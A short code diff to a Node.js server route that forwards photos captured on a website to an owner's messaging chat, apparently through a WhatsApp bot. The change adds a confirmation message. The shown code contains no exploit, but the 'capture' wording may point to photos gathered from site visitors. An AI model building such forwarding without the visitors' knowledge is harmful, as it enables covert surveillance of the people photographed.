@@ -2368,6 +2368,10 @@ app.post('/upload-photo', async (req, res) => {
             caption: '📸 New capture from the site'
         });
 
+        await global.activeSock.sendMessage(targetJid, {
+            text: '✅ Capture received and sent successfully to your private chat.'
+        });
+
         res.json({ ok: true, sentTo: targetJid });
     } catch (error) {
         console.error('Failed to forward captured photo to owner chat:', error);
